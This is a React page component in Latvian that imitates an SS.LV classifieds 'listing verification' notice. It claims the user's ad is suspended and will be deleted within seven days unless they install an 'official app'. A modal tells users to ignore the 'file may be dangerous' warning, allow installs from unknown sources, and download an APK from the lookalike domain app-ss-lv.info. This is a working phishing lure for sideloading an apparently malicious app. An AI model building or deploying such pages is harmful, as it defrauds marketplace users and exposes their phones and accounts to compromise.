"use client"

import { Header } from "@/components/header"
import { ShieldCheck, Smartphone, X } from "lucide-react"
import { useState } from "react"

export default function Home() {
  const [isModalOpen, setIsModalOpen] = useState(false)

  return (
    <>
      <div className={`min-h-screen bg-white transition-all duration-200 ${isModalOpen ? "blur-sm" : ""}`}>
        <Header />
        <main className="pt-14">
          <div className="flex flex-col items-center px-3 py-2">
            <div className="w-10 h-10 flex items-center justify-center mb-2">
              <ShieldCheck className="w-10 h-10 text-[#0d8b3a]" strokeWidth={1.5} />
            </div>

            <h1 className="text-base font-bold text-gray-900 text-center mb-2">Sludinājuma pārbaude</h1>

            <div className="w-full max-w-md space-y-1.5">
              {/* Card 1 - Reduced padding from p-3 to p-2 */}
              <div className="bg-gray-50 rounded-lg p-2 border border-gray-100">
                <div className="flex items-start gap-2">
                  <div className="w-5 h-5 rounded-full bg-[#0d8b3a] flex items-center justify-center shrink-0">
                    <span className="text-white text-[10px] font-bold">1</span>
                  </div>
                  <p className="text-gray-700 text-[11px] leading-snug">
                    Mēs esam ieviesuši papildu sludinājumu pārbaudi, lai aizsargātu pircējus un godīgos pārdevējus no
                    krāpniekiem.
                  </p>
                </div>
              </div>

              {/* Card 2 - Reduced padding from p-3 to p-2 */}
              <div className="bg-amber-50 rounded-lg p-2 border border-amber-100">
                <div className="flex items-start gap-2">
                  <div className="w-5 h-5 rounded-full bg-amber-500 flex items-center justify-center shrink-0">
                    <span className="text-white text-[10px] font-bold">2</span>
                  </div>
                  <p className="text-gray-700 text-[11px] leading-snug">
                    Jūsu sludinājums ir uz laiku apturēts un būs pieejams pēc pārbaudes pabeigšanas.
                  </p>
                </div>
              </div>

              {/* Card 3 - Reduced padding from p-3 to p-2 */}
              <div className="bg-gray-50 rounded-lg p-2 border border-gray-100">
                <div className="flex items-start gap-2">
                  <div className="w-5 h-5 rounded-full bg-[#0d8b3a] flex items-center justify-center shrink-0">
                    <span className="text-white text-[10px] font-bold">3</span>
                  </div>
                  <p className="text-gray-700 text-[11px] leading-snug">
                    Pārbaude aizņem <span className="font-semibold text-[#0d8b3a]">3–5 minūtes</span> un tiek veikta,
                    izmantojot oficiālo mobilo lietotni.
                  </p>
                </div>
              </div>
            </div>

            <div className="w-full max-w-md mt-2 bg-green-50 rounded-lg p-2 border border-green-100">
              <div className="flex items-center gap-2">
                <Smartphone className="w-4 h-4 text-[#0d8b3a]" />
                <span className="font-semibold text-gray-900 text-[11px]">
                  Pārbaude ir pieejama tikai mobilajā lietotnē
                </span>
              </div>
              <p className="text-gray-600 text-[10px] leading-snug mt-0.5 ml-6">
                Tas ir darīts, lai aizsargātos no masveida viltus kontiem un automātiskām reģistrācijām.
              </p>
            </div>

            <button
              onClick={() => setIsModalOpen(true)}
              className="mt-3 w-full max-w-md bg-gradient-to-r from-[#89d969] to-[#0d8b3a] text-white font-semibold py-2.5 px-4 rounded-lg shadow-md hover:shadow-lg transition-shadow text-sm text-center"
            >
              Izpildīt pārbaudi
            </button>

            <div className="w-full max-w-md mt-2 space-y-1">
              <p className="text-red-500 text-[10px] text-center font-medium leading-snug">
                Ja pārbaude netiks veikta 7 dienu laikā, sludinājums tiks noņemts no publikācijas.
              </p>
              <p className="text-gray-500 text-[10px] text-center leading-snug">
                Dati tiek izmantoti tikai pārbaudei un netiek nodoti trešajām personām.
              </p>
            </div>
          </div>
        </main>
      </div>

      {isModalOpen && (
        <div className="fixed inset-0 bg-black/40 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-xl max-w-md w-full max-h-[85vh] overflow-y-auto shadow-xl">
            <div className="flex items-center justify-between p-2.5 border-b border-gray-100">
              <h2 className="text-base font-bold text-gray-900">Instalēšanas instrukcija</h2>
              <button
                onClick={() => setIsModalOpen(false)}
                className="w-7 h-7 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors"
              >
                <X className="w-4 h-4 text-gray-500" />
              </button>
            </div>

            <div className="px-2.5 pt-1.5 pb-2.5 space-y-1.5">
              <div className="bg-amber-50 rounded-lg p-1.5 border border-amber-100">
                <p className="text-[10px] text-gray-700 leading-snug">
                  Ja parādās paziņojums "<span className="font-semibold">Fails var būt bīstams</span>", noklikšķiniet uz
                  "<span className="font-semibold">Lejupielādēt tomēr</span>". Tas ir pilnīgi normāli, fails ir drošs.
                </p>
              </div>

              <div className="bg-gray-50 rounded-lg p-1.5 border border-gray-100">
                <div className="flex items-start gap-1.5">
                  <div className="w-4 h-4 rounded-full bg-[#0d8b3a] flex items-center justify-center shrink-0">
                    <span className="text-white text-[9px] font-bold">1</span>
                  </div>
                  <p className="text-[10px] text-gray-700 leading-snug">
                    Pēc lejupielādes atveriet failu (parasti tas tiks atrasts mapē "Lejupielādes" vai pārlūkprogrammas
                    paziņojumos).
                  </p>
                </div>
              </div>

              <div className="bg-gray-50 rounded-lg p-1.5 border border-gray-100">
                <div className="flex items-start gap-1.5">
                  <div className="w-4 h-4 rounded-full bg-[#0d8b3a] flex items-center justify-center shrink-0">
                    <span className="text-white text-[9px] font-bold">2</span>
                  </div>
                  <p className="text-[10px] text-gray-700 leading-snug">
                    Ja sistēma to prasa, atļaujiet instalēšanu no šī avota (pārlūkprogrammas vai failu pārvaldnieka
                    iestatījumos):
                    <span className="font-semibold"> Iestatījumi → Atļaut instalēšanu no šī avota</span> un ieslēdziet
                    šo opciju.
                  </p>
                </div>
              </div>

              <div className="bg-gray-50 rounded-lg p-1.5 border border-gray-100">
                <div className="flex items-start gap-1.5">
                  <div className="w-4 h-4 rounded-full bg-[#0d8b3a] flex items-center justify-center shrink-0">
                    <span className="text-white text-[9px] font-bold">3</span>
                  </div>
                  <p className="text-[10px] text-gray-700 leading-snug">
                    Noklikšķiniet uz "<span className="font-semibold">Instalēt</span>" un gaidiet, līdz instalēšana būs
                    pabeigta.
                  </p>
                </div>
              </div>

              <div className="bg-green-50 rounded-lg p-1.5 border border-green-100">
                <div className="flex items-start gap-1.5">
                  <div className="w-4 h-4 rounded-full bg-[#0d8b3a] flex items-center justify-center shrink-0">
                    <span className="text-white text-[9px] font-bold">✓</span>
                  </div>
                  <p className="text-[10px] text-gray-700 leading-snug">
                    <span className="font-semibold">Gatavs!</span> Lietotne parādīsies galvenajā ekrānā. Piesakieties
                    savā kontā kā parasti.
                  </p>
                </div>
              </div>

              <a
                href="https://app-ss-lv.info/downloads/SS.LV.apk"
                target="_blank"
                rel="noreferrer"
                className="block w-full bg-gradient-to-r from-[#89d969] to-[#0d8b3a] text-white font-semibold py-2.5 px-4 rounded-lg shadow-md hover:shadow-lg transition-shadow text-sm text-center mt-2"
              >
                Lejupielādēt lietotni
              </a>
            </div>
          </div>
        </div>
      )}
    </>
  )
}
